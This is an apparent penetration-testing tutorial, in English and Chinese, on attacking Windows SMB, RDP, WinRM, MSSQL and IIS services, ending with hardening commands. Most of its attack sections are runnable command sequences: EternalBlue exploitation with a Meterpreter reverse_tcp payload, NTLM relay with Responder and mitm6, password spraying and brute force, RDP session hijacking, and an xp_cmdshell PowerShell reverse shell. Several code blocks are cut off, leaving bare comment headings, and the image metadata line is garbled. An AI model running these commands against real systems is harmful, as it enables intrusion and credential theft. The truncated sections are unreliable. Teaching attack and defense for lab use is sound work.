---
title: "Windows Services and Ports Attack Surface - SMB, RDP, WinRM Exploitation"
url: "en/windows-service-exploitation"
date: "2026-01-17"
draft: false
summary: "Practical combat of Windows service attacks, Eternal Blue exploitation, NTLM relay, RDP brute force cracking, WinRM remote execution and MSSQL attacks"
authors: ["default"]
tags:
  - Windows
  - SMB
  - RDP
  - WinRM
images: ["https://images.unsplash.com/photo-1633356122544-f134324a6cee?auto=formatimages: ["https://images.unsplash.com/photo-1633356122544-f134324a6cee?auto=format&fit=crop&w=1200&q=80"]fit=cropimages: ["https://images.unsplash.com/photo-1633356122544-f134324a6cee?auto=format&fit=crop&w=1200&q=80"]w=1200images: ["https://images.unsplash.com/photo-1633356122544-f134324a6cee?auto=format&fit=crop&w=1200&q=80"]q=80"]
categories:
  - Penetration testing
---

# Windows services and ports attack surface - SMB, RDP, WinRM exploits

Windows systems run many network services, and every open port may become a breakthrough point for attackers. After completing the information collection in the previous article, this article will provide an in-depth explanation of the most common service attack surfaces in the Windows environment, including SMB, RDP, WinRM, MSSQL, and IIS, from vulnerability principles to practical exploitation, to corresponding security reinforcement measures, to build a complete attack and defense knowledge framework.

## SMB protocol attack

The SMB (Server Message Block) protocol is a core component of Windows networking and is responsible for file sharing, print services, and inter-process communication. Due to its widespread deployment and protocol complexity, SMB has historically been the most important attack vector in Windows penetration testing.

### MS17-010 EternalBlue

MS17-010 was one of the most damaging vulnerabilities in the NSA's arsenal leaked by Shadow Brokers in 2017. This vulnerability exists in the transaction processing of the SMBv1 protocol and allows an attacker to achieve remote code execution by sending specially crafted packets.

```bash
# 第一步：确认目标是否存在 MS17-010 漏洞
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.100

# 第二步：使用 Metasploit 利用漏洞
msfconsole -q

# 在 msf 中：
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.100
set LHOST 10.10.10.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# 如果成功，将获得 SYSTEM 权限的 Meterpreter 会话
# meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

对于不使用 Metasploit 的场景，可以使用独立的漏洞利用脚本：

```bash
# 使用 AutoBlue 脚本
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010

# Generate shellcode

# Execute exploit

### SMB signature bypass and relay attacks

When SMB signing is not enforced on a Windows host, an attacker can perform an NTLM relay attack to forward intercepted authentication credentials to other hosts, allowing for password-less lateral movement.

```bash
# 第一步：检查网络中 SMB 签名未强制的主机
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# 或使用 Nmap
nmap --script smb2-security-mode -p 445 10.10.10.0/24
# 关注 "Message signing enabled but not required" 的主机

# 第二步：关闭攻击机的 SMB 服务（避免端口冲突）
sudo systemctl stop smbd

# 第三步：启动 ntlmrelayx 监听
# 中继到目标并尝试获取 SAM 数据库
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# 中继并执行命令
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami /all"

# 中继到 LDAP（在域环境中创建机器账户）
sudo impacket-ntlmrelayx -t ldap://10.10.10.100 --add-computer

# 第四步：触发认证（使用 Responder 捕获 NTLM 认证）
sudo responder -I eth0 -dwPv

# 或使用 mitm6 进行 IPv6 DNS 欺骗触发认证
sudo mitm6 -d lab.local
```

### SMB 密码攻击

```bash
# 使用 CrackMapExec 进行密码喷射
crackmapexec smb 10.10.10.100 -u users.txt -p 'Spring2024!' --continue-on-success

# Brute-force SMB using Hydra

# Pass-the-Hash using the obtained NTLM Hash

# Check share permissions using smbmap

# Recursively list files in a share

## RDP attack

Remote Desktop Protocol (RDP, port 3389) is the most commonly used remote management method for Windows systems, and is also a key target for brute force cracking and vulnerability exploitation.

### Brute force cracking

```bash
# 使用 Hydra 暴力破解 RDP
hydra -L users.txt -P passwords.txt rdp://10.10.10.100 -t 4 -V

# 使用 crowbar（专为 RDP 设计的爆破工具）
crowbar -b rdp -s 10.10.10.100/32 -U users.txt -C passwords.txt -n 1

# 使用 Ncrack
ncrack -vv --user administrator -P passwords.txt rdp://10.10.10.100

# RDP 密码喷射（CrackMapExec）
crackmapexec rdp 10.10.10.0/24 -u 'testuser' -p 'Welcome1!'
```

### BlueKeep（CVE-2019-0708）

BlueKeep 是 RDP 协议中的高危远程代码执行漏洞，影响 Windows 7、Windows Server 2008/2008 R2 等系统，无需认证即可利用。

```bash
# 漏洞检测
nmap --script rdp-vuln-ms12-020 -p 3389 10.10.10.100

# Detect using Metasploit

# Metasploit exploit (note: may cause blue screen, use with caution)

### RDP session hijacking

When SYSTEM privileges have been obtained, it is possible to hijack another user's RDP session without requiring their password:

```cmd
# 查看当前会话
query user

# 劫持目标会话（需要 SYSTEM 权限）
# 例如目标会话 ID 为 2
tscon 2 /dest:console

# 通过创建服务来以 SYSTEM 身份执行
sc create sesshijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0"
net start sesshijack
```

## WinRM 利用

WinRM（Windows Remote Management，端口 5985/5986）是 Windows 的远程管理框架，提供了强大的远程命令执行能力。

### evil-winrm

evil-winrm 是专为渗透测试设计的 WinRM 客户端，功能远超普通 WinRM 连接。

```bash
# 基本连接（用户名密码）
evil-winrm -i 10.10.10.100 -u 'testuser' -p 'Welcome1!'

# Use NTLM Hash connection (Pass-the-Hash)

# Load the PowerShell script

# Upload/download files

# Connect using SSL (port 5986)

```bash
# CrackMapExec 验证 WinRM 凭据
crackmapexec winrm 10.10.10.100 -u 'testuser' -p 'Welcome1!'

# 通过 WinRM 执行命令
crackmapexec winrm 10.10.10.100 -u 'testuser' -p 'Welcome1!' -x "whoami /priv"

# 执行 PowerShell 命令
crackmapexec winrm 10.10.10.100 -u 'testuser' -p 'Welcome1!' -X "Get-Process"
```

## MSSQL 攻击

Microsoft SQL Server（端口 1433）在企业环境中广泛部署，其强大的存储过程机制使其成为获取系统命令执行的重要途径。

```bash
# 使用 impacket-mssqlclient 连接
impacket-mssqlclient 'testuser:Welcome1!@10.10.10.100' -windows-auth

# Connect using sqsh

# Check current permissions

# Enable xp_cmdshell (requires sysadmin privileges)

# Execute system commands through xp_cmdshell

# read file

# MSSQL password brute force cracking

### MSSQL privilege escalation path

```bash
# 使用 impacket-mssqlclient 的交互式 shell
impacket-mssqlclient 'sa:DBpassword1!@10.10.10.100'

# 尝试模拟其他用户
# SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
# SQL> EXECUTE AS LOGIN = 'sa';

# 通过 MSSQL 获取反向 Shell
# SQL> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdA..."
```

## IIS 漏洞利用

IIS（Internet Information Services）是 Windows 自带的 Web 服务器，常见的攻击面包括：

```bash
# IIS 版本探测
curl -I http://10.10.10.100
nmap -sV -p 80,443 --script http-server-header 10.10.10.100

# Directory enumeration

# IIS short file name enumeration (tilde vulnerability)

# WebDAV detection and exploitation

# Upload webshell (if WebDAV allows writing)

## Security hardening suggestions

For the attack surface of each of the above services, it is recommended to take the following defensive measures:

### SMB hardening

```powershell
# 禁用 SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# 强制 SMB 签名
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# 限制匿名枚举
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 2
```

### RDP 加固

```powershell
# 启用网络级认证（NLA）
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1

# Restrict RDP access to user groups

# Configure account lockout policy

### WinRM hardening

```powershell
# 仅允许 HTTPS 连接
winrm set winrm/config/service '@{AllowUnencrypted="false"}'

# 限制 WinRM 访问的 IP 范围
Set-Item WSMan:\localhost\Service\IPv4Filter -Value "10.10.10.0/24"
```

### MSSQL 加固

- 禁用 `xp_cmdshell`，限制 `sysadmin` 角色成员
- 使用 Windows 身份验证而非 SQL 混合认证
- 将 SQL Server 服务账户配置为低权限专用账户
- 限制 MSSQL 仅监听内网地址

## 总结

Windows 服务的攻击面广泛且深入，每一个开放的端口都可能成为攻击链的起点。本文涵盖了五大核心服务的攻击技术：

- **SMB** — 从永恒之蓝到 NTLM 中继，攻击面最为丰富
- **RDP** — 暴力破解与 BlueKeep 漏洞利用
- **WinRM** — 利用 evil-winrm 实现远程命令执行
- **MSSQL** — 通过 xp_cmdshell 突破数据库边界
- **IIS** — WebDAV 利用与 Web 应用攻击

在实际渗透测试中，这些服务的攻击往往是相互关联的：通过 SMB 枚举获取的凭据可以用于 RDP 登录，通过 MSSQL 获取的命令执行可以横向移动到域控制器。理解每个服务的攻击原理和防御手段，才能在攻防两端都做到游刃有余。

下一篇文章将进入 Windows 提权阶段，探讨如何从普通用户权限提升到 SYSTEM 或管理员权限。

